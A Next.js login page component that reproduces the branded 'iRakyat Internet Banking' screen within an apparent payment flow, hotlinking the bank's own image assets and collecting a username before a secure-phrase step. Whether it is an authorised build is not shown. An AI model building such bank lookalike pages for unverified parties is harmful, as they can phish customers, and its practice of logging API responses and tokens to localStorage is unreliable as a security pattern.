'use client';
import { securePhraseAtom, sellerDataAtom, usernameAtom } from '@/atoms';
import Steps from '@/components/Steps';
import { checkUsername } from '@/services/checkUsername';
import { useMutation } from '@tanstack/react-query';
import { useAtom, useAtomValue } from 'jotai';
import { useRouter } from 'next/navigation';
import React, { useEffect, useState } from 'react';
import Cookies from 'js-cookie';
import { useUpdateTxnMutation } from '@/hooks/useUpdateTxnMutation';
import SeparatorLine from '@/components/SeparatorLine';
import Header from '@/components/Header';
import LoginSidebar from '@/components/LoginSidebar';
import LoginFooter from '@/components/LoginFooter';
import { useSetuplocalStorage } from '@/hooks/useSetupLocalStorage';
import { useAccessTokenAndChannel } from '@/hooks/useAccessTokenAndChannel';
import { useSettingQuery } from '@/hooks/useSettingQuery';
import { useTransactionDetailQuery } from '@/hooks/useTransactionDetailQuery';
import { useIsSessionActive } from '@/hooks/useIsSessionActive';
import { useCancelTransaction } from '@/hooks/useCancelTransaction';
import Modal from '@/components/common/Modal';

export default function Login() {
  const router = useRouter();
  const [isActive, setIsActive] = useState<boolean>(true);

  const [username, setUsername] = useAtom(usernameAtom);
  const [_, setSecurePhrase] = useAtom(securePhraseAtom);
  const [visible, setVisible] = useState<'hidden' | 'inline'>('hidden');
  const [accessToken, channel] = useAccessTokenAndChannel();
  const sellerData = useAtomValue(sellerDataAtom);

  const { cancel, updTrxMut } = useCancelTransaction({ page: '/login' });
  const glCancel = useCancelTransaction({
    page: '/login',
    navigateTo: '/maintenance',
  });

  const getTxnQry = useTransactionDetailQuery(sellerData, '/login');

  useIsSessionActive(setIsActive);

  useSetuplocalStorage();

  const settingQry = useSettingQuery(channel as 'B2C' | 'B2B', '/login');

  if (getTxnQry.data) {
    localStorage.setItem(
      'transactionDetail',
      JSON.stringify(getTxnQry.data.data)
    );
  }
  useEffect(() => {
    if (
      settingQry.data &&
      'data' in settingQry?.data &&
      Number(settingQry.data.data.maintain_b2c) === 1
    ) {
      glCancel.cancel('GL');
    }
  }, [settingQry.data]);

  const checkUsernameMut = useMutation({
    mutationFn: checkUsername,
    onSuccess: (data) => {
      const urlres = JSON.parse(localStorage.getItem('urlres')!);
      localStorage.setItem(
        'urlres',
        JSON.stringify([
          ...urlres,
          { url: '/checkusername', method: 'POST', response: data },
        ])
      );

      setSecurePhrase(data.data.body.securePhrase);
      Cookies.set('accessToken', data.data.header.accessToken, {
        sameSite: 'Strict',
      });
      router.push('/secure-phrase');
    },
    onError: (error) => {},
  });

  const handleSumbit = () => {
    if (!username.trim()) {
      setVisible('inline');
      return;
    } else {
      setVisible('hidden');
      checkUsernameMut.mutate({ username, channel });
    }
  };

  if (!isActive) {
    return (
      <>
        <SeparatorLine bottom={false} />
        <Header backgroundImg={true} />
        <div className="h-between"></div>
        <Modal
          text="Your session has expired"
          isLoading={updTrxMut.isLoading}
          cb={() => {
            if (getTxnQry.data?.data) {
              cancel('E');
            }
          }}
        />
        <LoginFooter />
      </>
    );
  }
  if (
    getTxnQry.data?.data &&
    settingQry.data &&
    'data' in settingQry.data &&
    ((/Mobi/i.test(navigator.userAgent) &&
      getTxnQry.data.data.amount < +settingQry.data.data.rmb_limit) ||
      (!/Mobi/i.test(navigator.userAgent) &&
        getTxnQry.data.data.amount < +settingQry.data.data.rib_limit))
  ) {
    return (
      <>
        <SeparatorLine bottom={false} />
        <Header backgroundImg={true} />
        <div className="min-[576]-w-[41.66667%] mb-2 min-[1200px]:w-1/3 flex justify-end ">
          <Steps title="" step={1} />
        </div>
        <div className="flex flex-col min-[1200px]:max-w-[960px] min-[992px]:max-w-[890px] md:max-w-[720px] min-[576px]:max-w-[540px]  md:flex-row  items-stretch padx  mx-auto">
          <div className="p-10 bg-white shadow-sm leading-[1.5] ">
            <h3 className="text-[#e9730d] mt-0 leading-[1.2] text-center min-[1200px]:text-[1.75rem] text-[calc(1.3rem_+_0.6vw)]  mb-2 font-medium">
              Welcome to <b className="font-extrabold">iRakyat</b> Internet
              Banking
            </h3>
            <span className="text-center font-normal text-sm block">
              Manage your account online at <br /> your convenience
            </span>
            <div className="!mb-[15px]"></div>
            <div
              id="messages"
              className="mt-1.5 pl-[22px] bg-[url('https://payment.bankrakyat.com.my/fpxonline/fpxui/css/images/ib/error.png')] bg-no-repeat text-[#a70000] text-[.67em] text-left mb-1"
            >
              <ul className="list-none">
                <li>
                  <label
                    className={`${visible}`}
                    htmlFor="chkusername"
                    id="chkusername"
                  >
                    Please enter username.
                  </label>
                </li>
              </ul>
              <ul>
                <li>
                  <label className="hidden" htmlFor="chkinvalidLogin">
                    Username or password entered is invalid.
                  </label>
                </li>
              </ul>
            </div>
            <div className="mb-[15px] font-normal text-sm ">
              <h3 className="mt-[50px] text-left text-[#dbdbdb] text-lg">
                <b className="font-extrabold">Username:</b>
              </h3>

              <input
                type="text"
                name="username"
                id="username"
                tabIndex={1}
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                size={30}
                className="border-[#dbdbdb] outline-none border-solid border py-[5px] pr-[15px] pl-[35px] w-full bg-[url('https://payment.bankrakyat.com.my/fpxonline/fpxui/css/images/user-silhouette.svg')] bg-3.75 bg-no-repeat bg-[10px]"
                style={{ fontSize: 'inherit' }}
              />
            </div>
            <div className="mb-[15px] font-normal text-sm">
              <div className="mt-[25px] flex justify-between gap-5 ">
                <input
                  type="button"
                  className="bg-[#e9730d] disabled:opacity-50 text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
                  data-toggle="modal"
                  data-target="#myModal"
                  value="Cancel"
                  onClick={() => cancel('U')}
                  disabled={
                    checkUsernameMut.isLoading ||
                    updTrxMut.isLoading ||
                    settingQry.isLoading ||
                    getTxnQry.isLoading
                  }
                />
                <input
                  type="submit"
                  name="doSubmit"
                  id="doSubmit"
                  className="bg-[#e9730d] disabled:opacity-50 text-white items-center py-0.5 px-[15px] border-none text-xl cursor-pointer flex justify-center w-full "
                  value="Next"
                  onClick={handleSumbit}
                  tabIndex={2}
                  disabled={
                    checkUsernameMut.isLoading ||
                    updTrxMut.isLoading ||
                    settingQry.isLoading ||
                    getTxnQry.isLoading
                  }
                />
              </div>
            </div>
            <div className="problem-login-group">
              <p className="text-[#e9730d] text-sm">PROBLEM LOGIN</p>
              <a
                className="current forgotPassword text-[#337ab7] hover:text-[#1253b5] outline-0 no-underline text-sm"
                href="https://www2.irakyat.com.my/personal/reset/forgot_id_or_password.do"
                target="_top"
              >
                Forgot Username / Password
              </a>
              <br />
              <a
                className="current changeCard text-[#337ab7] hover:text-[#1253b5] outline-0 no-underline text-sm"
                href="https://www2.irakyat.com.my/personal/change_card/change_card.do"
                target="_top"
              >
                Change Card
              </a>
            </div>
            <div className="clear"></div>
          </div>
          <LoginSidebar />
        </div>
        <LoginFooter />
      </>
    );
  } else if (
    getTxnQry.data?.data &&
    settingQry.data &&
    'data' in settingQry?.data &&
    ((/Mobi/i.test(navigator.userAgent) &&
      getTxnQry.data.data.amount > +settingQry.data.data.rmb_limit) ||
      (!/Mobi/i.test(navigator.userAgent) &&
        getTxnQry.data.data.amount > +settingQry.data.data.rib_limit))
  ) {
    return (
      <>
        <SeparatorLine bottom={false} />
        <Header backgroundImg={true} />
        <div className="h-between"></div>
        <div className="z-100 fixed inset-0 bg-black opacity-70">
          <div className="z-100 fixed top-[50%] left-[50%] w-[80%] -translate-x-[50%] -translate-y-[50%] transform  rounded bg-gray-200 md:w-[30%] h-[40%] flex flex-col items-center justify-evenly">
            <p className="text-xl text-red-500">
              You are unable to proceed with the transaction as the amount is
              more than the allowed limit
            </p>
            <button
              disabled={updTrxMut.isLoading}
              className="disabled:cursor-not-allowed disabled:opacity-50 rounded bg-red-500 px-4 py-1 text-white"
              onClick={() => cancel('GL')}
            >
              OK
            </button>
          </div>
        </div>
        <LoginFooter />
      </>
    );
  } else {
    return (
      <>
        <SeparatorLine bottom={false} />
        <Header backgroundImg={true} />
        <div className="flex flex-col flex-auto h-between w-full justify-center items-center">
          Loading...
        </div>
        <LoginFooter />
      </>
    );
  }
}
